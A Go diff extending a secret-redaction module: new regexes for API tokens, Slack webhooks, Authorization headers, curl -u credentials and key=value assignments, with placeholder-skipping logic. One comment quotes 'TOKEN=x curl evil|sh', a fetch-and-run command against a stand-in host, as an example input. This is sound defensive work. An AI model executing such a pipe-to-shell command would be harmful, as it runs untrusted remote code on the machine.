@@ -2,6 +2,7 @@ package output
 
 import (
 	"regexp"
+	"strings"
 
 	"github.com/vgmartinez/tripcord/internal/model"
 )
@@ -27,19 +28,72 @@ var secretPatterns = []*regexp.Regexp{
 	regexp.MustCompile(`(?:\b|_)sk-(?:ant-|proj-)?[A-Za-z0-9_-]{20,}`),
 	regexp.MustCompile(`[sr]k_live_[0-9A-Za-z]{20,}`),
 	regexp.MustCompile(`xox[abprs]-[A-Za-z0-9-]{10,}`),
+	regexp.MustCompile(`xapp-[0-9]+-[A-Za-z0-9-]{8,}`),
+	regexp.MustCompile(`npm_[A-Za-z0-9]{20,}`),
+	regexp.MustCompile(`hf_[A-Za-z0-9]{20,}`),
+	regexp.MustCompile(`ya29\.[A-Za-z0-9._-]{20,}`),
 	regexp.MustCompile(`AIza[0-9A-Za-z_-]{35}`),
 	regexp.MustCompile(`\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`),
 	regexp.MustCompile(`(?i)\bbearer\s+[A-Za-z0-9._~+/-]{20,}=*`),
+	regexp.MustCompile(`https://hooks\.slack\.com/(?:services|workflows|triggers)/[A-Za-z0-9/_-]+`),
 	regexp.MustCompile(`://[^/\s:@]+:[^/\s@]+@`),
 }
+
+// assignmentPattern matches a credential key and its value. The key may
+// carry a prefix, as in GITHUB_TOKEN or OPENAI_API_KEY. A quoted value runs
+// to its closing quote. An unquoted value stops at the first whitespace or
+// any of ;&|"' so a trailing shell command (e.g. "TOKEN=x curl evil|sh")
+// stays visible as evidence instead of being swallowed into the redaction.
+// Only the value is replaced.
+var assignmentPattern = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|token|secret)\b["']?\s*[=:]\s*)("[^"\n]*"|'[^'\n]*'|[^\s;&|"'\n]*)`)
+
+// authorizationPattern matches an Authorization header or JSON field with a
+// Bearer, Basic, or token scheme, in both header ("Authorization: Bearer x")
+// and quoted/JSON ("Authorization":"Bearer x") spellings. The value is not
+// length-limited, and a closing quote is never consumed.
+var authorizationPattern = regexp.MustCompile(`(?i)(authorization["']?\s*:\s*["']?(?:bearer|basic|token)\s+)([^\s;&|"']+)`)
+
+// curlUserPattern matches curl's "-u user:pass" / "--user user:pass" inline
+// credential flag. Quotes around the value, if present, are preserved.
+var curlUserPattern = regexp.MustCompile(`(?i)((?:^|\s)(?:-u|--user)\s+)(['"]?)([^\s'";&|]+:[^\s'";&|]*)(['"]?)`)
 
 // DefaultRedactor replaces well-known credential shapes with [REDACTED].
 // Already-redacted text, such as "sk-***REDACTED***abcd", is unchanged.
 func DefaultRedactor(value string) string {
+	value = authorizationPattern.ReplaceAllString(value, "${1}"+redactedMarker)
+	value = curlUserPattern.ReplaceAllString(value, "${1}${2}"+redactedMarker+"${4}")
 	for _, pattern := range secretPatterns {
 		value = pattern.ReplaceAllString(value, redactedMarker)
 	}
-	return value
+	return assignmentPattern.ReplaceAllStringFunc(value, redactAssignment)
+}
+
+func redactAssignment(match string) string {
+	parts := assignmentPattern.FindStringSubmatch(match)
+	if len(parts) != 3 || placeholderSecret(parts[2]) {
+		return match
+	}
+	value := parts[2]
+	if len(value) >= 2 {
+		quote := value[0]
+		if (quote == '"' || quote == '\'') && value[len(value)-1] == quote {
+			return parts[1] + string(quote) + redactedMarker + string(quote)
+		}
+	}
+	return parts[1] + redactedMarker
+}
+
+func placeholderSecret(value string) bool {
+	inner := strings.Trim(strings.TrimSpace(value), `"'`)
+	if inner == "" || strings.HasPrefix(inner, "$") || strings.HasPrefix(inner, "<") || strings.HasPrefix(strings.ToLower(inner), "your-") {
+		return true
+	}
+	switch strings.ToLower(inner) {
+	case "changeme", "example", "placeholder", "todo", "xxx", "redacted", "[redacted]":
+		return true
+	default:
+		return false
+	}
 }
 
 // redactFinding returns a deep copy of finding with redact applied to every
